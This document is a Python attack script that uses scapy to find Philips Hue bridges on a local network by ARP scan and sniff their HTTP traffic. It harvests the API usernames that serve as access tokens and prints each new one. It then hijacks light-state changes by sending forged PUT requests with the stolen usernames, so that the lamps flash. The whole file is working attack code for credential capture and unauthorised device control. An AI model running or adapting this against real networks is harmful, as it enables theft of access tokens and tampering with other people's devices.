import requests
import sys
import time

import scapy.all as sc

from scapy_http import http

def find_hues_range(ip):
	arp_req = sc.ARP(pdst=ip)
	broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_req_broad = broadcast/arp_req
	
	answered = sc.srp(arp_req_broad, timeout=1, verbose=False)[0]
	for c in answered:
		if c[1].hwsrc[:8] == "00:17:88":
			client_dict = {"ip": c[1].psrc, "mac": c[1].hwsrc}
			hues.append(client_dict)
	return
	
def handle_package(pkt):
	# Check if package is indeed HTTP-Request and Prevent self-loop by firing after on requests
	if pkt.haslayer(http.HTTPRequest) and hasattr(pkt[http.HTTPRequest], "User-Agent") and getattr(pkt[http.HTTPRequest], "User-Agent").decode("utf-8")[:15] != "python-requests":
		path = pkt[http.HTTPRequest].Path.decode("utf-8")
		pathA = path.split("/")
		if pathA[1] == "api": # We're only interested in API-calls
			handle_user(pathA)
			if len(pathA) > 5 and pathA[3] == "lights" and pathA[5] == "state": # If lamps change color, we interfere
				handle_state_change(pkt, pathA)
	return
	
def handle_user(pathA):
	user = pathA[2]
	if user not in users:
		users.append(user)
		print("New user found: " + user)
	return
	
def handle_state_change(pkt, pathA):
	ip = pkt[http.HTTPRequest].Host.decode("utf-8")
	bodyOn='{"on": true, "bri": 25, "hue": 30000, "sat": 128}'
	bodyOff='{"on": false}'
	
	requests.put("http://" + ip + "/api/" + pathA[2] + "/lights/" + pathA[4] + "/state", data=bodyOn, headers={'content-type':'text/plain'})
	time.sleep(1)
	requests.put("http://" + ip + "/api/" + pathA[2] + "/lights/" + pathA[4] + "/state", data=bodyOff, headers={'content-type':'text/plain'})
	time.sleep(1)
	requests.put("http://" + ip + "/api/" + pathA[2] + "/lights/" + pathA[4] + "/state", data=bodyOn, headers={'content-type':'text/plain'})
	return
	
if len(sys.argv) > 1:
	print("Ready")

	hues = []
	users = []

	find_hues_range(sys.argv[1])
	print(str(len(hues)) + " hue(s) found")
	
	for hue in hues:
		sc.sniff(filter="ip and host " + hue['ip'], prn=handle_package, store=0)